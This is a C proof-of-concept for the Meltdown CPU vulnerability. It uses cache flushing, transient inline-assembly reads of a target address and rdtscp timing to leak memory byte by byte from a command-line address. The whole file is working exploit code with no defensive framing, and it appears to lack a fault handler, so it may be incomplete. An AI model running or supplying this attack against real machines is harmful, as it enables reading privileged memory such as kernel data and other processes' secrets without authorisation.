#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

uint8_t *probe_array;
size_t PAGE_SIZE;

void calculate_page_size() {
    PAGE_SIZE = 4096;//sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1) {
        perror("sysconf");
        exit(EXIT_FAILURE);
    }
}

void flush_cache() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * PAGE_SIZE]);
    }
}

uint64_t measure_access_time(volatile uint8_t *addr) {
    uint64_t start, end;
    unsigned int junk;

    start = __rdtscp(&junk);
    junk = *addr;
    end = __rdtscp(&junk) - start;
    return end;
}

void meltdown_read_byte(size_t target_address, uint8_t value[2], int score[2], int cache_hit_threshold) {
    static int results[256];
    unsigned int junk = 0;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    memset(results, 0, sizeof(results));
    flush_cache();

    asm volatile(
        ".rept 400\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"
        :
        :
        : "rax"
    );

    asm volatile(
        "1:\n\t"
        "movzx (%%rcx), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        "movzx (%1,%%rax,1), %%rbx\n"
        :
        : "c"(target_address), "r"(probe_array)
        : "rax", "rbx"
    );

    for (int i = 0; i < 256; i++) {
        addr = &probe_array[i * PAGE_SIZE];
        time1 = measure_access_time(addr);
        if (time1 <= cache_hit_threshold) {
            results[i]++;
        }
    }

    int j = -1, k = -1;
    for (int i = 0; i < 256; i++) {
        if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
        } else if (k < 0 || results[i] >= results[k]) {
            k = i;
        }
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, char *argv[]) {
    // !!!!! DONT FORGET TO ADD type of the secret variable
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <memory address> <length> <CACHE_HIT_THRESHOLD>\n", argv[0]);
        return 1;
    }

    size_t memory_address = strtoull(argv[1], NULL, 0);
    int length = atoi(argv[2]);
    int cache_hit_threshold = atoi(argv[3]);

    calculate_page_size();
    probe_array = malloc(256 * PAGE_SIZE);
    if (probe_array == NULL) {
        perror("malloc");
        return 1;
    }

    uint8_t value[2];
    int score[2];

    printf("Reading %d bytes:\n", length);

    for (int i = 0; i < length; i++) {
        meltdown_read_byte(memory_address + i, value, score, cache_hit_threshold);
        printf("Reading at memory_address + %d = %p... ", i, (void *)(memory_address + i));
        printf("Best guess: 0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) {
            printf("\n\t\t\t(second best: 0x%02X='%c' score=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }

    free(probe_array);
    return 0;
}
